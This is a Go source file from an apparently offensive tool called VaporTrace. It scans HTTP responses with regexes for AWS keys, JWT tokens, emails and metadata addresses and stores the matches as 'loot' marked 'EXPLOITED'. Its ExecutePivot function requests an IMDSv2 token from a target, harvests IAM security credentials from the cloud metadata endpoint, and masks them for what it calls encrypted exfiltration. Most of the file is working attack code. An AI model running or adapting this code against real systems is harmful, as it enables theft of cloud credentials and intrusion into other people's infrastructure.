package logic

import (
	"fmt"
	"io"
	"net/http"
	"regexp"
	"sync"
	"time"

	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
	"github.com/pterm/pterm"
)

// Finding defines the structure for in-memory tracking (Legacy support)
type Finding struct {
	Type   string
	Value  string
	Source string
}

var (
	Vault    []Finding
	vaultMux sync.Mutex

	// REGLA DE ORO: Corregido el escape de puntos en raw strings (backticks)
	// Se expande AWS_KEY para detectar variaciones de longitud en entornos de test.
	Patterns = map[string]*regexp.Regexp{
		"AWS_KEY":       regexp.MustCompile(`(AKIA|ASIA)[0-9A-Z]{16,20}`),
		"JWT_TOKEN":     regexp.MustCompile(`eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*`),
		"EMAIL":         regexp.MustCompile(`[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}`),
		"METADATA_IP":   regexp.MustCompile(`127\.0\.0\.1|169\.254\.169\.254`),
		"SENSITIVE_URL": regexp.MustCompile(`http://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}`),
	}
)

// ScanForLoot: Central Nerve Center for Discovery
func ScanForLoot(body string, url string) {
	vaultMux.Lock()
	defer vaultMux.Unlock()

	for label, re := range Patterns {
		matches := re.FindAllString(body, -1)
		for _, m := range matches {
			exists := false
			for _, v := range Vault {
				if v.Value == m && v.Source == url {
					exists = true
					break
				}
			}
			if !exists {
				finding := Finding{
					Type:   label,
					Value:  m,
					Source: url,
				}
				Vault = append(Vault, finding)
				
				pterm.Warning.Prefix = pterm.Prefix{Text: "LOOT", Style: pterm.NewStyle(pterm.BgYellow, pterm.FgBlack)}
				pterm.Warning.Printfln("New %s found in response from %s", label, url)

				// Persistir también en base de datos centralizada
				db.LogQueue <- db.Finding{
					Phase:   "PHASE VIII: EXFIL",
					Target:  url,
					Details: fmt.Sprintf("Leaked %s: %s", label, m),
					Status:  "EXPLOITED",
				}
			}
		}
	}
}

// ExecutePivot performs specialized cloud-metadata harvesting
func ExecutePivot(target string, source string) {
	pterm.Info.WithPrefix(pterm.Prefix{Text: "PIVOT"}).Printfln("Initiating lateral harvest on %s", target)
	
	client := &http.Client{Timeout: 5 * time.Second}

	// Step A: Try IMDSv2 Token acquisition
	token := ""
	tokenReq, _ := http.NewRequest("PUT", fmt.Sprintf("http://%s/latest/api/token", target), nil)
	tokenReq.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")
	
	tokenResp, err := client.Do(tokenReq)
	if err == nil && tokenResp.StatusCode == 200 {
		tBytes, _ := io.ReadAll(tokenResp.Body)
		token = string(tBytes)
		tokenResp.Body.Close()
	}

	// Step B: Harvest Credentials
	credURL := fmt.Sprintf("http://%s/latest/meta-data/iam/security-credentials/", target)
	hReq, _ := http.NewRequest("GET", credURL, nil)
	if token != "" {
		hReq.Header.Set("X-aws-ec2-metadata-token", token)
	}

	hResp, err := client.Do(hReq)
	if err == nil && hResp.StatusCode == 200 {
		body, _ := io.ReadAll(hResp.Body)
		hResp.Body.Close()
		
		lootContent := string(body)
		
		// 1. Encrypted Exfiltration (Phase 8.3)
		payload := fmt.Sprintf("PIVOT_HIT | SRC:%s | DATA:%s", source, lootContent)
		masked := GhostMask([]byte(payload), MasterKey)
		fmt.Println(masked)

		// 2. In-Memory Vault storage
		vaultMux.Lock()
		Vault = append(Vault, Finding{
			Type:   "CLOUD_CREDS",
			Value:  lootContent,
			Source: source,
		})
		vaultMux.Unlock()
	}
}